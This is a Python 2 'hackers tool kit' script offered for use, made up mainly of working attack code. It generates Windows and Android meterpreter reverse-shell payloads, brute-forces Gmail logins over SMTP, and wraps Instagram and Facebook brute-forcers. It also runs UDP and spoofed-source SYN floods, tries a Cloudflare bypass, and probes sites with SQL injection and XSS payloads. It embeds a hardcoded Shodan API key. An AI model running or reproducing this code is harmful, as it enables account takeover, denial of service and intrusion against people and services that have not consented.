#!/usr/local/bin/python
# coding: latin-1
import platform
import webbrowser
import hashlib
import subprocess
import zipfile
import colorama
from modules import *
import modules.colors
import builtwith
from urllib2 import Request, urlopen, URLError, HTTPError
from urllib import urlencode
from plugins.DNSDumpsterAPI import DNSDumpsterAPI
import whois
import json
from urlparse import urlparse
from re import search, sub
import cookielib
import socket
from scapy.all import *
from threading import Thread, active_count
import os
import random
import string
import signal
import ssl  
import argparse
import sys
import socks
import mechanize
import requests
import time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)
r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
os.system("service tor start")
os.system("clear")
def mainbanner():
	print N+"""  _                _                       _              _       _    _ _   
  _                _                       _              _       _    _ _   
 | |__   __ _  ___| | _____ _ __ ___      | |_ ___   ___ | |     | | _(_) |_ 
 | '_ \ / _` |/ __| |/ / _ \ '__/ __|_____| __/ _ \ / _ \| |_____| |/ / | __|
 | | | | (_| | (__|   <  __/ |  \__ \_____| || (_) | (_) | |_____|   <| | |_ 
 |_| |_|\__,_|\___|_|\_\___|_|  |___/      \__\___/ \___/|_|     |_|\_\_|\__|
\033[34m
		..............                                    
			    ..,;:ccc,.                             
			  ......''';lxO.                           
		.....''''..........,:ld;                           
			   .';;;:::;,,.x,                          
		      ..'''.            0Xxoc:,.  ...               
		  ....                ,ONkc;,;cokOdc',.            
		 .                   OMo           ':ddo.          
				    dMc               :OO;          
				    0M.                 .:o.       
				    ;Wd                            
				     ;XO, 			\033[93mCreated By @unkn0wn_bali On Insagram\033[34m                         
				       ,d0Odlc;,..                 
				           ..',;:cdOOd::,.        
				                    .:d;.':;.     
				                       'd,  .'     
				                         ;l   ..    
				                          .o       
				                            c
				                            .'                             
				                             .\033[92m
				 ██░ ██ ▄▄▄█████▓ ██ ▄█▀
				▓██░ ██▒▓  ██▒ ▓▒ ██▄█▒ 
				▒██▀▀██░▒ ▓██░ ▒░▓███▄░ 
				░▓█ ░██ ░ ▓██▓ ░ ▓██ █▄ 
				░▓█▒░██▓  ▒██▒ ░ ▒██▒ █▄
				 ▒ ░░▒░▒  ▒ ░░   ▒ ▒▒ ▓▒
				 ▒ ░▒░ ░    ░    ░ ░▒ ▒░
				 ░  ░░ ░  ░      ░ ░░ ░ 
				 ░  ░  ░         ░  ░   					 
	""".decode('utf-8')
def help():
			print B+"""
▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒▓  ▒  ▒ ░    ░▒   ▒  ▒ ░░▒░▒▒▓▒▒░   ▒▓▒▒░  ▒ ░   ░ ▒░   ▒ ▒ 
 ▒   ▒▒ ░░ ░▒  ░ ░ ░ ▒  ▒  ░       ░   ░  ▒ ░▒░ ░▒ ░▒░   ▒ ░▒░  ░     ░ ░░   ░ ▒░
 ░   ▒   ░  ░  ░   ░ ░  ░  ░ ░   ░ ░   ░  ░  ░░ ░░ ░ ░   ░ ░ ░  ░ ░      ░   ░ ░ 
     ░  ░      ░     ░                 ░  ░  ░  ░░   ░   ░   ░                 ░ 
\033[0m		            ░                                                             
?       :	displays this message
clear   :	clears screen except for banner
exit    :	exits script
rebootl :	reboot whole device
winload :	windows reverse_tcp payload
andload :	android reverse_tcp payload
command :	execute terminal command
msfcon  :	metasploit console
set     :	setoolkit console
msfven  :	msfvenom
gmail   :	gmail bruteforce
insta   :	instagram bruteforce
fb      :	facebook bruteforce
ipgrab  :	host to ip address
myip    :	show your ip
wifite  :	run wifite commands
mon     :	put device in monitor mode
netdev  :	find all devices in your network
scannet :	scan for networks around you
port    :	scan for ports on a host
info    :	info gather on a host [includes port scan]
sysinfo :	info about your system
msfex   :	shows all metasploit exploits [takes a bit]
udp     :	UDP flood / dos
tcp     :	TCP flood / dos
syn     :	SYN flood / dos
ping    :	pings host
\033[91m---------------------------------------------------------------------------------\033[0m
	"""
def winload():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	os.system('msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 R> /root/desktop/file.exe LHOST=', ipaddr)
	print Y+"payload made to desktop with port 4444\033[0m"
def andload():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	os.system('msfvenom -p android/meterpreter/reverse_tcp LPORT=8080 R> /root/desktop/file.exe LHOST=', ipaddr)
	print Y+"payload made to desktop with port 8080\033[0m"
def gmail():
  #!/usr/bin/python
  '''create by Ha3MrX'''

  import smtplib
  from os import system

  def main():
     print '\033[93m================================================='
     print '\033[91m               create by Ha3MrX                  '
     print '\033[93m================================================='
     print '\033[95m               ++++++++++++++++++++              '
     print '\n                                               '
     print '\033[92m  _,.                                            '
     print '                                                 '
     print '                                                 '
     print '           HA3MrX                                '
     print '       _,.                   '
     print '     ,` -.)                  '
     print '    ( _/-\\-._               '
     print '   /,|`--._,-^|            , '
     print '   \_| |`-._/||          , | '
     print '     |  `-, / |         /  / '
     print '     |     || |        /  /  '
     print '      `r-._||/   __   /  /   '
     print '  __,-<_     )`-/  `./  /    '
     print '  \   `---    \   / /  /     '
     print '     |           |./  /      '
     print '     /           //  /       '
     print ' \_/  \         |/  /        '
     print '  |    |   _,^- /  /         '
     print '  |    , ``  (\/  /_         '
     print '   \,.->._    \X-=/^         '
     print '   (  /   `-._//^`           '
     print '    `Y-.____(__}             '
     print '     |     {__)              ' 
     print '           () \033[91m  V.1.0        '

  main()
  print '\033[0m[1] start the attack'
  print '[2] exit'
  option = input('==>')
  if option == 1:
     file_path = raw_input('path of passwords file :')
  else:
     system('clear')
     exit()
  pass_file = open(file_path,'r')
  pass_list = pass_file.readlines()
  def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
  login()
def port():
	n = raw_input("Enter Target: ")
	os.system("nmap " + n)
def insta():
  print "Type username wordlist threads    Example: --> unkn0wn_bali wordlist.txt 60"
  insta = raw_input("--> ")
  os.system("python /root/hackers-tool-kit/tools/instagram.py " + insta)
def fb():
  print "Type Email / ID  Wordlist    Example: [FACEBOOK->]: nigga.andrew777 facelist.txt"
  facebook = raw_input("[FACEBOOK->]: ")
  os.system("cd /root/hackers-tool-kit/tools && perl fb-brute.pl " + facebook)
def ipgrab():
	b = raw_input(Y+'Enter Host\033[0m ')
	ip = socket.gethostbyname(b)
	print G+"------------------------\033[0m"
	print N+"Host: ", b
	print N+"IP: ", ip
	print G+"------------------------\033[0m"
def myip():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	print (G+"IP:\033[0m", ipaddr, "\033[92m Gateway:\033[0m", gateway, "\033[92m Host:\033[0m", host)
def wifite():
	print Y+"HIT ENTER TO JUST RUN WIFITE WITH NO ARGUMENTS"
	print Y+"! DONT TYPE WIFITE ONLY TYPE THE ARGUMENTS !"
	w = raw_input(R+"[\033[93mWIFITE\033[91m]\033[0m> ")
	os.system("wifite ", w)
def mon():
	os.system("iwconfig")
	i = raw_input("Select Interface: ")
	os.system("airmon-ng start ", i)
def netdev():
	os.system("netdiscover")
def scannet():
	os.system("iwconfig")
	m = raw_input("Select Interface: ")
	os.system("airodump-ng " + m)
def info():
  params = []
  # Browser
  br = mechanize.Browser()

  # Just some colors and shit
  white = '\033[1;97m'
  green = '\033[1;32m'
  red = '\033[1;31m'
  yellow = '\033[1;33m'
  end = '\033[1;m'
  info = '\033[1;33m[!]\033[1;m'
  que =  '\033[1;34m[?]\033[1;m'
  bad = '\033[1;31m[-]\033[1;m'
  good = '\033[1;32m[+]\033[1;m'
  run = '\033[1;97m[~]\033[1;m'

  # Cookie Jar
  cj = cookielib.LWPCookieJar()
  br.set_cookiejar(cj)

  # Browser options
  br.set_handle_equiv(True)
  br.set_handle_redirect(True)
  br.set_handle_referer(True)
  br.set_handle_robots(False)

  # Follows refresh 0 but not hangs on refresh > 0
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  br.addheaders = [
      ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


  print '''\033[1;31m
     _________ __          __ __
    /   _____//  |________|__|  | __ ___________
    \_____  \\\\   __\_  __ \  |  |/ // __ \_  __ \\
    /        \|  |  |  | \/  |    <\  ___/|  | \/
   /_______  /|__|  |__|  |__|__|_ \\\\___  >__|
           \/                     \/    \/\033[1;m'''
  target = raw_input('\033[1;34m[?]\033[1;m Enter the target: ')
  if 'http' in target:
      parsed_uri = urlparse(target)
      domain = '{uri.netloc}'.format(uri=parsed_uri)
  else:
      domain = target
      try:
          br.open('http://' + target)
          target = 'http://' + target
      except:
          target = 'https://' + target

  def sqli(url):
      print '%s Using SQLMap api to check for SQL injection vulnerabilities. Don\'t worry we are using an online service and it doesn\'t depend on your internet connection. This scan will take 2-3 minutes.' % run
      br.open('https://suip.biz/?act=sqlmap')
      br.select_form(nr=0)
      br.form['url'] = url
      req = br.submit()
      result = req.read()
      match = search(r"---(?s).*---", result)
      if match:
          print '%s One or more parameters are vulnerable to SQL injection' % good
          option = raw_input(
              '%s Would you like to see the whole report? [Y/n] ' % que).lower()
          if option == 'n':
              pass
          else:
              print '\033[1;31m-\033[1;m' * 40
              print match.group().split('---')[1][:-3]
              print '\033[1;31m-\033[1;m' * 40
      else:
          print '%s None of parameters is vulnerable to SQL injection' % bad


  def cms(domain):
      try:
          result = br.open('https://whatcms.org/?s=' + domain).read()
          detect = search(r'class="nowrap" title="[^<]*">', result)
          WordPress = False
          try:
              r = br.open(target + '/robots.txt').read()
              if "wp-admin" in str(r):
                  WordPress = True
          except:
              pass
          if detect:
              print '%s CMS Detected : %s' % (info, detect.group().split('class="nowrap" title="')[1][:-2])
              detect = detect.group().split('">')[1][:-27]
              if 'WordPress' in detect:
                  option = raw_input(
                      '%s Would you like to use WPScan? [Y/n] ' % que).lower()
                  if option == 'n':
                      pass
                  else:
                      os.system('wpscan --random-agent --url %s' % domain)
          elif WordPress:
              print '%s CMS Detected : WordPress' % info
              option = raw_input(
                  '%s Would you like to use WPScan? [Y/n] ' % que).lower()
              if option == 'n':
                  pass
              else:
                  os.system('wpscan --random-agent --url %s' % domain)
          else:
              print '%s %s doesn\'t seem to use a CMS' % (info, domain)
      except:
          pass

  def honeypot(ip_addr):
      result = {"0.0": 0, "0.1": 10, "0.2": 20, "0.3": 30, "0.4": 40, "0.5": 50, "0.6": 60, "0.7": 70, "0.8": 80, "0.9": 90, "1.0": 10}
      honey = 'https://api.shodan.io/labs/honeyscore/%s?key=C23OXE0bVMrul2YeqcL7zxb6jZ4pj2by' % ip_addr
      try:
          phoney = br.open(honey).read()
          if float(phoney) >= 0.0 and float(phoney) <= 0.4:
              what = good
          else:
              what = bad
          print '{} Honeypot Probabilty: {}%'.format(what, result[phoney])
      except KeyError:
          print '\033[1;31m[-]\033[1;m Honeypot prediction failed'

  def whoisIt(url):
      who = ""
      print '{} Trying to gather whois information for {}'.format(run,url)
      try:
          who = str(whois.whois(url)).decode()
      except Exception:
          pass
      test = who.lower()
      if "whoisguard" in test or "protection" in test or "protected" in test:
          print '{} Whois Protection Enabled{}'.format(bad, end)
      else:
          print '{} Whois information found{}'.format(good, end)
          try:
              data = json.loads(who)
              for key in data.keys():
                  print "{} :".format(key.replace("_", " ").title()),
                  if type(data[key]) == list:
                      print ", ".join(data[key])
                  else:
                      print "{}".format(data[key])
          except ValueError:
              print '{} Unable to build response, visit https://who.is/whois/{} {}'.format(bad, url, end) 
      pass

  def nmap(ip_addr):
      port = 'http://api.hackertarget.com/nmap/?q=' + ip_addr
      result = br.open(port).read()
      result = sub(r'Starting[^<]*\)\.', '', result)
      result = sub(r'Service[^<]*seconds', '', result)
      result = os.linesep.join([s for s in result.splitlines() if s])
      print result

  def bypass(domain):
      post = urlencode({'cfS': domain})
      result = br.open(
          'http://www.crimeflare.info/cgi-bin/cfsearch.cgi ', post).read()

      match = search(r' \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', result)
      if match:
          bypass.ip_addr = match.group().split(' ')[1][:-1]
          print '%s Real IP Address : %s' % (good, bypass.ip_addr)

  def dnsdump(domain):
      res = DNSDumpsterAPI(False).search(domain)
      print '\n%s DNS Records' % good
      for entry in res['dns_records']['dns']:
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      for entry in res['dns_records']['mx']:
          print '\n%s MX Records' % good
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n\033[1;32m[+]\033[1;m Host Records (A)'
      for entry in res['dns_records']['host']:
          if entry['reverse_dns']:
              print '{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}'.format(**entry)
          else:
              print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n%s TXT Records' % good
      for entry in res['dns_records']['txt']:
          print entry
      print '\n%s DNS Map: https://dnsdumpster.com/static/map/%s.png\n' % (good, domain.strip('www.'))


  def fingerprint(ip_addr):
      try:
          result = br.open('https://www.censys.io/ipv4/%s/raw' % ip_addr).read()
          match = search(r'&#34;os_description&#34;: &#34;[^<]*&#34;', result)
          if match:
              print '%s Operating System : %s' % (good, match.group().split('n&#34;: &#34;')[1][:-5])
      except:
          pass


  ip_addr = socket.gethostbyname(domain)
  print '%s IP Address : %s' % (info, ip_addr)
  try:
      r = requests.get(target)
      header = r.headers['Server']
      if 'cloudflare' in header:
          print '%s Cloudflare detected' % bad
          bypass(domain)
          try:
              ip_addr = bypass.ip_addr
          except:
              pass
      else:
          print '%s Server: %s' % (info, header)
      try:
          print '%s Powered By: %s' % (info, r.headers['X-Powered-By'])
      except:
          pass
      try:
          r.headers['X-Frame-Options']
      except:
          print '%s Clickjacking protection is not in place.' % good
  except:
      pass
  fingerprint(ip_addr)
  cms(domain)
  try:
      honeypot(ip_addr)
  except:
      pass
  print "{}----------------------------------------{}".format(red, end)
  whoisIt(domain)
  try:
      r = br.open(target + '/robots.txt').read()
      print '\033[1;31m-\033[1;m' * 40
      print '%s Robots.txt retrieved\n' % good, r
  except:
      pass
  print '\033[1;31m-\033[1;m' * 40
  nmap(ip_addr)
  print '\033[1;31m-\033[1;m' * 40
  dnsdump(domain)
  os.system('cd plugins && python theHarvester.py -d %s -b all' % domain)
  try:
      br.open(target)
      print '%s Crawling the target for fuzzable URLs' % run
      for link in br.links():
          if 'http' in link.url or '=' not in link.url:
              pass
          else:
              url = target + '/' + link.url
              params.append(url)
      if len(params) == 0:
          print '%s No fuzzable URLs found' % bad
          quit()
      print '%s Found %i fuzzable URLs' % (good, len(params))
      for url in params:
          print url
          sqli(url)
          url = url.replace('=', '<svg/onload=alert()>')
          r = br.open(url).read()
          if '<svg/onload=alert()>' in r:
              print '%s One or more parameters are vulnerable to XSS' % good
          break
      print '%s These are the URLs having parameters:' % good
      for url in params:
          print url
  except:
      pass
def sysinfo():
	os.system("ifconfig")
	os.system("iwconfig")
	os.system("neofetch")
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	print (" IP: ", ipaddr, " Gateway: ", gateway, " Host: ", host)
def msfex():
	os.system("msfconsole -x show exploits")
def udp():
	target = raw_input(N+"Target:\033[91m ")
	ip = socket.gethostbyname(target)
	port = input(N+"Port:\033[91m ")
	os.system("service tor restart")
	print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
	os.system("sleep 2s")
	sent = 0
	print "KILLING %s CONNECTIONS"%(ip)						
	while True:
		sock.sendto(Gb, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(Kb, (ip,port))
		sent = sent + 1
		port = port + 1
		print B+"|+| Slapping \033[0m|\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
		if port == 65534:
			port = 1
def tcp():
	tcp = raw_input(Y+"[\033[92m+\033[91m-\033[0mTCP\033[91m-\033[92m+\033[93m]\033[0m ")
	os.system("python " + tcp)
def syn():
  def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

  def randInt():
    x = random.randint(1000,9000)
    return x  

  def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    print "Packets are sending ..."
    for x in range (0,counter):
      s_port = randInt()
      s_eq = randInt()
      w_indow = randInt()

      IP_Packet = IP ()
      IP_Packet.src = randomIP()
      IP_Packet.dst = dstIP

      TCP_Packet = TCP () 
      TCP_Packet.sport = s_port
      TCP_Packet.dport = dstPort
      TCP_Packet.flags = "S"
      TCP_Packet.seq = s_eq
      TCP_Packet.window = w_indow

      send(IP_Packet/TCP_Packet, verbose=0)
      total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


  def info():

    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return dstIP,int(dstPort)
    

  def main():
    dstIP,dstPort = info()
    counter = input ("Packets : ")
    SYN_Flood(dstIP,dstPort,int(counter))

  main()


def main():
	found = False
	while not found:
		x = raw_input(N+'\033[91m[\033[0mhtk\033[91m]\033[94m->\033[92m: \033[0m')
		if x == "?":
			help()
		if x == "winload" :
			winload()
		if x == "clear" :
			os.system("clear")
			mainbanner()
		if x == "andload":
			andload()
		if x == "command":
			c = raw_input("Command: ")
			os.system(c)
		if x == "msfcon" :
			os.system("msfconsole")
		if x == "set":
			os.system("setoolkit")
		if x == "msfven":
			print R+"!ONLY TYPE THE ARGUMENTS DONT TYPE MSFVENOM\033[0m"
			v = raw_input(G+"MSFVENOM: \033[0m")
			os.system("msfvenom", v)
		if x == "gmail" :
			gmail()
		if x == "insta":
			insta()
		if x == "fb" :
			fb()
		if x == "ipgrab":
			ipgrab()
		if x == "myip":
			myip()
		if x == "wifite":
			wifite()
		if x == "mon" :
			mon()
		if x == "netdev" :
			netdev()
		if x == "scannet":
			scannet()
		if x == "exit" :
			import sys
			print "follow \033[92m@unkn0wn_bali\033[0m on instagram"
			sys.exit()
		if x == "rebootl":
			print R+"! ARE YOU SURE YOU WANT TO REBOOT YOUR WHOLE DEVICE !\033[0m"
			c = raw_input("[y/n]> ")
			if c == "y" :
				os.system("reboot")
			if c == "n" :
				os.system("clear")
				mainbanner()
				main()
		if x == "port":
			port()
		if x == "info":
			info()
		if x == "sysinfo":
			sysinfo()
		if x == "msfex":
			msfex()
		if x == "udp":
			udp()
		if x == "tcp":
			tcp()
		if x == "syn":
			syn()
	found = True
mainbanner()
main()
